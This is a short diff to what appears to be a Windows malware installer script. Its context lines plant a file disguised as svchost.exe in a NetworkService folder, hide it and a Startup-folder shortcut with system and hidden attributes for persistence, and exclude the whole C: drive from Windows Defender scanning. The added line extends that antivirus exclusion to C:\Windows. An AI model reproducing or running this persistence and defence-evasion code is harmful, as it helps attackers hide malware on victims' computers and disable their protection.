@@ -3,3 +3,4 @@ $s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\AppDat
 attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
 attrib +h +s +i +r "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.lnk"
 Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "C:\Windows"
